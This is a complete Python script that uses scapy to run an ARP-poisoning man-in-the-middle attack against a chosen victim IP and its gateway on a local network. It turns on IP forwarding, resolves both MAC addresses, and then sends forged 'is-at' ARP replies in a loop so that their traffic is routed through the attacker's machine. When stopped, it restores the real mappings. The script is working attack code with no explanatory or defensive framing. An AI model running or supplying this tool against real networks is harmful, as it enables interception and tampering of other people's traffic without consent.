#!/usr/bin/python3

import os
from scapy.all import *

# Number ARP replies sent as broadcast to recover original victim and gw MAC
arp_rep_br = 20

def usage():
    print("\nUsage: \n python3 {} interface_name victim_ip gatewy_ip".format(sys.argv[0]))

def manage_forwarding(value):
    os.system("sysctl -w net.ipv4.ip_forward={} 1>/dev/null".format(value))

def get_mac(ip):
    print("\n!!! Sending ARP request to resolve {} via broadcast !!!".format(ip))
    ans, uns = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, iface=interface)
    return ans[0][1].src
    
if len(sys.argv) !=4:
    usage()
    sys.exit(1)

interface = sys.argv[1]
victim_ip = sys.argv[2] 
dfgw_ip = sys.argv[3]  

if not interface in get_if_list():
    print("\nCan't locate interface {}, exiting".format(interface))
    sys.exit(1)

print("\n!!! Enabling IP forwarding !!!")
manage_forwarding("1")

# Get victim and gw mac address
try:
    victim_mac = get_mac(victim_ip)
    dfgw_mac = get_mac(dfgw_ip)
except IndexError:
    print("\n!!! Can't resolve IP address to MAC, exiting !!!")
    print("\n!!! Disabling IP forwarding !!!")
    manage_forwarding("0")
    sys.exit(1)

print("\n!!! Starting ARP poisoning !!!") 

while True:
    try:
        # Send spoofed ARP reply to victim with attacker MAC and gw IP as Sender MAC and IP 
        sendp(Ether(dst=victim_mac)/ARP(hwlen=6, plen=4, op="is-at", hwdst=victim_mac, psrc=dfgw_ip, pdst=victim_ip), iface=interface)

        # Send sppofed ARP reply to gateway with attacker MAC and victim IP as Sender MAC and IP 
        sendp(Ether(dst=dfgw_mac)/ARP(hwlen=6, plen=4, op="is-at", hwdst=dfgw_mac,psrc=victim_ip, pdst=dfgw_ip), iface=interface)
        time.sleep(2)

    except KeyboardInterrupt:
        print("\n!!! Restoring MAC addresses !!!")

        # Send ARP reply as broadcast with gateway MAC and gw IP as Sender MAC and IP
        sendp(Ether()/ARP(hwlen=6, plen=4, op="is-at", hwdst="ff:ff:ff:ff:ff:ff", psrc=dfgw_ip, pdst=victim_ip, hwsrc=dfgw_mac), iface=interface, count=arp_rep_br)

        # Send ARP reply as broadcast with victim MAC and IP as Sender MAC and IP
        sendp(Ether()/ARP(hwlen=6, plen=4, op="is-at", hwdst="ff:ff:ff:ff:ff:ff", psrc=victim_ip, pdst=dfgw_ip, hwsrc=victim_mac), iface=interface, count=arp_rep_br)

        print("\n!!! Disabling IP forwarding !!!")
        manage_forwarding("0")
        sys.exit(1)
